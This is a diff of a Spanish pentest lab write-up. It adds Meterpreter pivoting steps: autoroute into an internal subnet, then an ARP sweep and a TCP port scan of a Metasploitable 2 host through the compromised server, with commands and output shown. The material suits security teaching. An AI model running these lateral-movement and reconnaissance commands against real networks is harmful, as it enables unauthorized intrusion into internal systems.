@@ -127,20 +127,48 @@ Ejecutamos el comando de diagnóstico de red dentro de la sesión activa:
 ```bash
 meterpreter > ifconfig
 ```
+
 ![servidor](ifconfig-servidor.png)
 
-Tras analizar el volcado del comando, se identifica la existencia de un segundo adaptador físico de red (**Interface 16**) parametrizado con la dirección IP `192.168.50.10` en un segmento `/24`. Esto confirma que el servidor actúa como un nodo de pivotaje hacia una zona desmilitarizada o red interna aislada.
+El volcado revela la existencia de un segundo adaptador físico de red (Interface 16) parametrizado con la dirección IP 192.168.50.10 bajo una máscara 255.255.255.0. Esto confirma que el servidor tiene acceso directo a un segmento interno aislado.
 
 
 ### Paso 4.2: Configuración del Enrutamiento Estático (Pivoting)
+Para permitir que las herramientas de Metasploit Framework alcancen el nuevo segmento descubierto (192.168.50.0/24) empleando el servidor comprometido como pasarela, ejecutamos la directiva autoroute desde la propia consola interactiva de Meterpreter.
 
-Para permitir que las herramientas de Metasploit Framework alcancen el nuevo segmento descubierto (`192.168.50.0/24`) empleando el servidor comprometido como pasarela, ejecutamos el script automatizado `autoroute` desde la propia consola interactiva.
-
-```bash
+```Bash
 meterpreter > run autoroute -s 192.168.50.0/24
-[*] Adding a route to 192.168.50.0/24...
+[*] Adding a route to 192.168.50.0/255.255.255.0...
+[+] Added route to 192.168.50.0/255.255.255.0 via 10.10.10.20
 ```
+Para verificar la inserción del nuevo camino en la tabla de enrutamiento global del Framework, enviamos la sesión a segundo plano e imprimimos las reglas de enrutamiento activas:
+
 ![autoroute](run-autoroute.png)
 
+### Paso 4.3: Escaneo y Descubrimiento del Objetivo Oculto (Metasploitable)
+Con la tabla de enrutamiento del Framework apuntando de forma efectiva al segmento interno a través del túnel establecido, procedemos a realizar un reconocimiento táctico de la red aislada. Para ello, inicializamos el módulo auxiliar arp_sweep para auditar la topología de la red local oculta.
 
+```Bash
+msf exploit(multi/handler) > use auxiliary/scanner/discovery/arp_sweep
+msf auxiliary(scanner/discovery/arp_sweep) > set RHOSTS 192.168.50.0/24
+msf auxiliary(scanner/discovery/arp_sweep) > set THREADS 10
+msf auxiliary(scanner/discovery/arp_sweep) > run
+```
+Una vez validada la topología del segmento, se confirma que la dirección IP asignada a la máquina objetivo Metasploitable 2 dentro de la red privada es la 192.168.50.20.
+
+![autoroute](run-autoroute.png)
+
+### Paso 4.4: Enumeración de Servicios mediante Portscan Interno
+Para verificar los servicios activos y mapear los vectores de entrada potenciales en la máquina objetivo a través del pivote, cargamos el módulo auxiliar de escaneo TCP enfocado en los puertos críticos de administración y transferencia (21, 22, 80, 445) apuntando hacia el host mapeado.
+
+```Bash
+msf auxiliary(scanner/discovery/arp_sweep) > use auxiliary/scanner/portscan/tcp
+msf auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.50.20
+msf auxiliary(scanner/portscan/tcp) > set PORTS 21, 22, 80, 445
+msf auxiliary(scanner/portscan/tcp) > set THREADS 5
+msf auxiliary(scanner/portscan/tcp) > run
+```
+![autoroute](runn-autoroute.png)
+
+El resultado del escaneo reporta de forma exitosa que todos los puertos analizados se encuentran en estado abierto (TCP OPEN), dejando al descubierto la superficie de ataque del objetivo interno.
 
